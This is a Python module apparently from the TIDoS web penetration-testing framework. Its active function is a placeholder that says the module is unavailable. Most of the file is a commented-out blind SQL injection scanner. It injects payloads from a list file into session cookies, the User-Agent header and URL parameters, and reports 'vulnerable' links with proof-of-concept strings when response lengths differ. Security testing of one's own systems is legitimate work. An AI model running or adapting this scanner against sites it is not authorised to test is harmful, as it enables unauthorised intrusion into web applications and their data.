#!/usr/bin/env python
from core.colors import color
def blindsqli(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# # coding: utf-8

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #Author: @_tID
# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import os
# import re
# import sys
# import urllib2
# import requests
# sys.path.append('files/payload-db/')
# from core.Core.colors import *
# from re import *
# import time
# from time import sleep
# from urllib2 import Request, urlopen
# from blindsqlsearch import blindsqlsearch

# global pay
# pay = []

# def auto0x00(web):

#     def sqlicookie0x00(web):

#         print(R+'\n    =========================')
#         print(R+'     S Q L i  (Cookie Based)')
#         print(R+'    =========================\n')

#         sleep(0.5)
#         session = requests.Session()
#         req = session.get(web)
#         if session.cookies:
#             print(G+' [+] This website supports session cookies...')
#             for i in pay:
#                 print(B+" [*] Trying Payload : "+C+''+ i)
#                 time.sleep(0.7)
#                 for cookie in session.cookies:
#                     cookie.value += i
#                     print(O+' [+] Using '+R+'!nfected'+O+' cookie : '+GR+cookie.value)
#                     r = session.get(web)
#                     if len(r.content) != len(req.content):
#                         poc = C+" [+] PoC : " +O+ cookie.name + " : " +GR+ cookie.value
#                         print(G+" [+] Blind Based SQli (Cookie Based) Detected! ")
#                         print(poc)
#                         print(P+' [+] Code : '+W+str(r.text)+'\n')

#         else:
#             print(R+' [-] No support for cookies...')
#             time.sleep(0.5)
#             print(R+' [-] Cookie based injection not possible...')

#     def sqliuser0x00(web):

#         print(R+'\n    =============================')
#         print(R+'     S Q L i  (User-Agent Based)')
#         print(R+'    =============================\n')
#         getrq = requests.get(web, verify=False)
#         for i in pay:
#             print(B+'\n [*] Using payload : '+C+i)
#             time.sleep(0.7)
#             user_agent = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux' + 'x86_64; rv:39.0) Gecko/20100101 Firefox/39.0'}
#             user_agent['User-agent'] += str(i)
#             req = requests.get(web, headers=user_agent, verify=False)
#             print(O+' [*] Using '+R+'!nfected'+O+' UA : '+GR+user_agent['User-agent'])
#             if len(req.content) != len(getrq.content):
#                 print(G+' [!] Blind based SQLi (User-Agent Based) Detected!')
#                 print(R+' [!] User-Agent : '+O+user_agent['User-agent'])

#     print(P+' [!] Enter an option :\n')
#     print(B+'   [1] '+C+'Cookie Based Blind Injection')
#     print(B+'   [2] '+C+'User-Agent Based Blind Injection')
#     print(B+'   [3] '+C+'Auto Awesome Module (Automated)\n')
#     q = raw_input(O+' [#] TID :> ')
#     if q == '3':
#         print(GR+' [*] Launching Auto-Awesome Module...')
#         blindsqlsearch(web)
#     elif q == '2':
#         print(GR+' [*] Launching User-Agent Based Module...')
#         sqliuser0x00(web)
#     elif q == '1':
#         print(GR+' [*] Launching Cookie-Based Module...')
#         sqlicookie0x00(web)

# def manual0x00(web):

#     print(R+'\n    ========================')
#     print(R+'     S Q L i  (Manual Mode)')
#     print(R+'    ========================\n')
#     bug = raw_input(O+' [#] Injectable Endpoint '+R+'(eg. /sqli/fetch.php?id=2)'+O+' :> ')
#     bugs = web + bug
#     getrq = requests.get(bugs, timeout=7, verify=False)
#     print(O+' [!] Using Url : '+GR+bugs)
#     if '?' in str(bugs) and '=' in str(bugs):
#         for p in pay:
#             bugged = bugs + str(p)
#             print(B+" [*] Trying : "+C+bugged)
#             sleep(0.7)
#             response = requests.get(bugged)
#             if len(response.content) != len(getrq.content):
#                 print('\n'+G+' [+] Vulnerable link detected : ' + bugs)
#                 print(GR+' [*] Injecting payloads...')
#                 print(B+' [!] PoC : ' + str(bugged))
#                 print(R+" [!] Payload : " + O + p + '\033[0m')
#                 print("\033[1m [!] Code Snippet :\n \033[0m" + str(response) + '\n')
#     else:
#         print(R+' [-] Enter an URL with scope parameter...')
#         manual0x00(web)

# def blindsqli(web):

#     while True:
#         print(GR+' [*] Loading module SQLi...')
#         sleep(0.6)
#         if web.endswith('/'):
#             web = web[:-1]
#         print(R+'\n    ==========================================')
#         print(R+'     S Q L   I N J E C T I O N  (Blind Based)')
#         print(R+'    ==========================================\n')
#         print(GR+' [*] Importing error parameters...')
#         sleep(0.8)
#         try:
#             with open('files/payload-db/blindsql_payloads.lst','r') as payloads:
#                 for payload in payloads:
#                     payload = payload.replace('\n','')
#                     pay.append(payload)

#             print(O+'\n [#] Enter the type you want to proceed:\n')
#             print(B+'   [1] '+C+'Manual Mode')
#             print(B+'   [2] '+C+'Automatic Mode\n')
#             p = raw_input(O+' [#] TID :> ')
#             if p == '1':
#                 print(GR+' [*] Initializing manual mode...')
#                 manual0x00(web)
#             if p == '2':
#                 print(GR+' [*] Loading automatic mode...')
#                 auto0x00(web)

#         except IOError:
#             print(R+' [-] Payloads file does not exist!')
